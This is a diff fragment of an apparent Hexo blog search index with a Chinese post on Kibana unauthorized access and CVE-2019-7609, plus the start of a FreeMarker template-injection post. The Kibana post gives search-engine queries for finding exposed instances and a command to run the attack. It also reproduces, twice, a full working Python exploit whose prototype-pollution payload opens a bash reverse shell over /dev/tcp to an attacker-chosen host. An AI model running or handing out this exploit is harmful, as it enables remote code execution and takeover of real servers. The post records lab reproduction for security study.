class="string">&#x27;&quot;version&quot;:&quot;(.*?)&quot;,&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        match = re.findall(pattern, r.content)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> match[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;9.9.9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version_compare</span>(<span class="params">standard_version, compare_version</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sc1 = StrictVersion(standard_version[<span class="number">0</span>])</span><br><span class="line">        sc2 = StrictVersion(standard_version[<span class="number">1</span>])</span><br><span class="line">        cc = StrictVersion(compare_version)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] ERROR : kibana version compare failed !&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc1 &gt; cc <span class="keyword">or</span> (StrictVersion(<span class="string">&quot;6.0.0&quot;</span>) &lt;= cc <span class="keyword">and</span> sc2 &gt; cc):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">global</span> version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> version <span class="keyword">or</span> <span class="keyword">not</span> version_compare([<span class="string">&quot;5.6.15&quot;</span>, <span class="string">&quot;6.6.1&quot;</span>], version):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;auto&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> r.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;&quot;seriesList&quot;&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">target, ip, port</span>):</span></span><br><span class="line">    random_name = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;qwertyuiopasdfghjkl&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*).props(label.__proto__.env.AAAA=&#x27;require(\&quot;child_process\&quot;).exec(\&quot;if [ ! -f /tmp/%s ];then touch /tmp/%s &amp;&amp; /bin/bash -c \\&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&#x27;; fi\&quot;);process.exit()//&#x27;)\n.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-15m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;10s&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> % (random_name, random_name, ip, port)</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r1 = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code == <span class="number">200</span>:</span><br><span class="line">        trigger_url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/socket.io/?EIO=3&amp;transport=polling&amp;t=MtjhZoM&quot;</span>)</span><br><span class="line">        new_headers = headers</span><br><span class="line">        new_headers.update(&#123;<span class="string">&#x27;kbn-xsrf&#x27;</span>: <span class="string">&#x27;professionally-crafted-string-of-text&#x27;</span>&#125;)</span><br><span class="line">        r2 = requests.get(trigger_url, verify=<span class="literal">False</span>, headers=new_headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, dest=<span class="string">&#x27;url&#x27;</span>, default=<span class="string">&quot;http://127.0.0.1:5601&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;such as: http://127.0.0.1:5601&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-host&quot;</span>, dest=<span class="string">&#x27;remote_host&#x27;</span>, default=<span class="string">&quot;127.0.0.1&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote host: such as: 1.1.1.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-port&quot;</span>, dest=<span class="string">&#x27;remote_port&#x27;</span>, default=<span class="string">&quot;8888&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote port: such as: 8888&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, dest=<span class="string">&#x27;reverse_shell&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell after verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">&#x27;-h&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.url</span><br><span class="line">    remote_host = args.remote_host</span><br><span class="line">    remote_port = args.remote_port</span><br><span class="line">    is_reverse_shell = args.reverse_shell</span><br><span class="line"></span><br><span class="line">    target = target.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">        target = <span class="string">&quot;http://&quot;</span> + target</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        version = get_kibana_version(target)</span><br><span class="line">        result = verify(target)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125; maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">            <span class="keyword">if</span> is_reverse_shell:</span><br><span class="line">                result = reverse_shell(target, remote_host, remote_port)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] reverse shell completely! please check session on: &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(remote_host, remote_port))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] cannot reverse shell&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;&#125; do not exists CVE-2019-7609 vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] cannot exploit!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error on: \n&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_43061533/article/details/111695028">(44条消息) Kibana未授权访问漏洞复现、CVE-2019-7609 Kibana远程代码执行漏洞复现_coc.的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web应用漏洞</category>
+        <category>Kibana</category>
+      </categories>
+      <tags>
+        <tag>-web应用漏洞 - Kibana -命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -3061,63 +3118,6 @@
       </categories>
       <tags>
         <tag>-内网渗透 -工具使用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kibana未授权访问利用</title>
-    <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Kibana &lt; 5.6.15</p>
-<p>Kibana &lt; 6.6.1</p>
-<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Fofa:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问kibana系统</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/app/kibana</span><br></pre></td></tr></table></figure>
-
-
-
-<p>无需账号密码就可以登录进入图形化界面</p>
-<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125150723328.png" class title="image-20211125150723328">
-
-
-
-<p>下面利用脚本进行攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-7609-kibana-rce.py -u 目标主机ip地址:5601 -host 攻击主机ip地址 -port 监听端口 –-shell</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162717040.png" class title="image-20211125162717040">
-
-
-
-<p>反弹shell成功</p>
-<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162801162.png" class title="image-20211125162801162">
-
-
-
-<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>poc地址 :</p>
-<p><a href="https://github.com/LandGrey/CVE-2019-7609">LandGrey&#x2F;CVE-2019-7609: exploit CVE-2019-7609(kibana RCE) on right way by python2 scripts (github.com)</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> distutils.version <span class="keyword">import</span> StrictVersion</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_kibana_version</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/app/kibana&quot;</span>)</span><br><span class="line">    r = requests.get(url, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">    patterns = [<span class="string">&#x27;&amp;quot;version&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, <span class="string">&#x27;&quot;version&quot;:&quot;(.*?)&quot;,&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> patterns:</span><br><span class="line">        match = re.findall(pattern, r.content)</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">return</span> match[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;9.9.9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version_compare</span>(<span class="params">standard_version, compare_version</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sc1 = StrictVersion(standard_version[<span class="number">0</span>])</span><br><span class="line">        sc2 = StrictVersion(standard_version[<span class="number">1</span>])</span><br><span class="line">        cc = StrictVersion(compare_version)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] ERROR : kibana version compare failed !&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc1 &gt; cc <span class="keyword">or</span> (StrictVersion(<span class="string">&quot;6.0.0&quot;</span>) &lt;= cc <span class="keyword">and</span> sc2 &gt; cc):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">global</span> version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> version <span class="keyword">or</span> <span class="keyword">not</span> version_compare([<span class="string">&quot;5.6.15&quot;</span>, <span class="string">&quot;6.6.1&quot;</span>], version):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-1m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;auto&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> r.headers.get(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;&quot;seriesList&quot;&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">target, ip, port</span>):</span></span><br><span class="line">    random_name = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="string">&#x27;qwertyuiopasdfghjkl&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;kbn-version&#x27;</span>: version,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;sheet&quot;:[&quot;.es(*).props(label.__proto__.env.AAAA=&#x27;require(\&quot;child_process\&quot;).exec(\&quot;if [ ! -f /tmp/%s ];then touch /tmp/%s &amp;&amp; /bin/bash -c \\&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&#x27;; fi\&quot;);process.exit()//&#x27;)\n.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)&quot;],&quot;time&quot;:&#123;&quot;from&quot;:&quot;now-15m&quot;,&quot;to&quot;:&quot;now&quot;,&quot;mode&quot;:&quot;quick&quot;,&quot;interval&quot;:&quot;10s&quot;,&quot;timezone&quot;:&quot;Asia/Shanghai&quot;&#125;&#125;&#x27;&#x27;&#x27;</span> % (random_name, random_name, ip, port)</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/api/timelion/run&quot;</span>)</span><br><span class="line">    r1 = requests.post(url, data=data, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code == <span class="number">200</span>:</span><br><span class="line">        trigger_url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target, <span class="string">&quot;/socket.io/?EIO=3&amp;transport=polling&amp;t=MtjhZoM&quot;</span>)</span><br><span class="line">        new_headers = headers</span><br><span class="line">        new_headers.update(&#123;<span class="string">&#x27;kbn-xsrf&#x27;</span>: <span class="string">&#x27;professionally-crafted-string-of-text&#x27;</span>&#125;)</span><br><span class="line">        r2 = requests.get(trigger_url, verify=<span class="literal">False</span>, headers=new_headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span>:</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, dest=<span class="string">&#x27;url&#x27;</span>, default=<span class="string">&quot;http://127.0.0.1:5601&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;such as: http://127.0.0.1:5601&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-host&quot;</span>, dest=<span class="string">&#x27;remote_host&#x27;</span>, default=<span class="string">&quot;127.0.0.1&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote host: such as: 1.1.1.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-port&quot;</span>, dest=<span class="string">&#x27;remote_port&#x27;</span>, default=<span class="string">&quot;8888&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell remote port: such as: 8888&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--shell&#x27;</span>, dest=<span class="string">&#x27;reverse_shell&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;reverse shell after verify&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        sys.argv.append(<span class="string">&#x27;-h&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.url</span><br><span class="line">    remote_host = args.remote_host</span><br><span class="line">    remote_port = args.remote_port</span><br><span class="line">    is_reverse_shell = args.reverse_shell</span><br><span class="line"></span><br><span class="line">    target = target.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">        target = <span class="string">&quot;http://&quot;</span> + target</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        version = get_kibana_version(target)</span><br><span class="line">        result = verify(target)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125; maybe exists CVE-2019-7609 (kibana &lt; 6.6.1 RCE) vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">            <span class="keyword">if</span> is_reverse_shell:</span><br><span class="line">                result = reverse_shell(target, remote_host, remote_port)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] reverse shell completely! please check session on: &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(remote_host, remote_port))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] cannot reverse shell&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] &#123;&#125; do not exists CVE-2019-7609 vulnerability&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] cannot exploit!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error on: \n&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_43061533/article/details/111695028">(44条消息) Kibana未授权访问漏洞复现、CVE-2019-7609 Kibana远程代码执行漏洞复现_coc.的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web应用漏洞</category>
-        <category>Kibana</category>
-      </categories>
-      <tags>
-        <tag>-web应用漏洞 - Kibana -命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -3445,62 +3445,6 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/</url>
-    <content><![CDATA[<h1 id="模板注入之Freemaker"><a href="#模板注入之Freemaker" class="headerlink" title="模板注入之Freemaker"></a>模板注入之Freemaker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
-<p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
-<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221142325248.png" class title="image-20220221142325248">
-
-<p>这种方式被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。</p>
-<p>而FreeMarker最初的设计，是被用来在MVC模式的Web开发框架中生成HTML页面的，它没有被绑定到 Servlet或HTML或任意Web相关的东西上。它也可以用于非Web应用环境中。</p>
-<p>FreeMarker 是 免费的， 基于Apache许可证2.0版本发布。</p>
-<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>FusionAuth存在Freemaker模板注入，涉及版本FusionAuth &lt;&#x3D; 1.11.0。</p>
-<p>FusionAuth是一个免费的身份管理平台，安装简单，易于集成。FusionAuth提供登录、注册、MFA、SSO、电子邮件模板、本地化、密码控制、强哈希、网络挂钩、基于角色的访问控制等功能。</p>
-<p><strong>下载命令</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-app-1.10.0.zip</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221143010639.png" class title="image-20220221143010639">
-
-
-
-<p>下载elasticsearch插件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-search-1.10.0.zip</span><br></pre></td></tr></table></figure>
-
